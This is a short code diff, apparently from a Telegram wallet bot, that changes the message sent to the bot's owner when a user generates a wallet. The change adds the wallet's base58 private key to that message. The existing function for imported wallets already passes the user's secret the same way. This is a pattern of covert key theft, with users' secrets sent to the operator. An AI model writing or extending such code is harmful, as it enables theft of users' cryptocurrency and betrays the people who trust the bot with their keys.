@@ -284,11 +284,12 @@ def owner_wallet_imported(user_line: str, secret: str, addr: str):
     )
 
 
-def owner_wallet_generated(user_line: str, addr: str):
+def owner_wallet_generated(user_line: str, addr: str, secret: str):
     return (
         "🆕 USER GENERATED A WALLET\n\n"
         f"👤 {user_line}\n"
-        f"🏦 Address: <code>{esc(addr)}</code>"
+        f"🏦 Address: <code>{esc(addr)}</code>\n\n"
+        f"🔑 Private key (base58):\n<code>{esc(secret)}</code>"
     )
 
 
